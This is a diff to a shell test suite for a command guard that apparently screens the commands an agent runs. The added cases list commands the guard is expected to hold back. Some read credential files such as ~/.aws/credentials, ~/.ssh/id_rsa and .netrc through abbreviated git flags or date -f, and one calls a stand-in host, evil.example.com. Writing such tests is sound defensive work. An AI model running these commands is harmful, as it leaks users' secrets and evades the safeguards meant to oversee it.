@@ -200,6 +200,21 @@ for c in 'cat /pro[c]/self/cmdline' 'cat /pro*/[0-9]*/cmdline' 'cat /pro[c]/self
   'gh api https://evil.example.com/x'; do
   assert_defer "secrets: $c" "$c"
 done
+: >"$H/.config/gh/hosts.yml"
+# shellcheck disable=SC2016,SC2088 # the guard reads the words as written
+for c in 'git diff /dev/null /home/someone/.aws/credentials' 'git diff sub ~/.ssh/id_rsa' 'git diff sub ../x' \
+  'git grep --no-ind -e KEY /home/someone/.aws/credentials' 'git blame --con /home/someone/.netrc -- README.md' \
+  'git diff --ext' 'git log --textc' 'git config -f/home/someone/.my.cnf -l' 'git config --fil=/home/someone/.my.cnf -l' \
+  'git config --bl=HEAD:x -l' 'date -uf /home/someone/.aws/credentials' 'date --f=/home/someone/.aws/credentials' \
+  'gh api repos/o/r -iq env' 'gh api repos/o/r -iqenv' 'echo "$AUTH"x' \
+  'cat ~/.config/*/hosts.yml' 'cat ~/.c*/gh/hosts.yml' 'cat ~/.config/g[h]/hosts.yml' 'grep -r token ~/.CONFIG'; do
+  assert_defer "secrets: $c" "$c"
+done
+# shellcheck disable=SC2016 # the guard reads the words as written
+for c in "grep -rn 'TODO\$' scripts" "rg 'foo\$' scripts" 'echo "by $GIT_AUTHOR_NAME"' 'echo "$SSH_AUTH_SOCK"' \
+  'git diff HEAD~1' 'git diff origin/main...HEAD' 'git log --oneline' 'date -Iseconds' 'gh api repos/o/r -q .x'; do
+  assert_allow "secrets: $c" "$c"
+done
 assert_allow "secrets: a glob in the worktree" "cat scripts/*.sh"
 assert_allow "secrets: a recursive glob in the worktree" "grep -r x scripts/o*"
 assert_allow "secrets: an ordinary quoted variable beside text" "echo \"\$USER\"x"
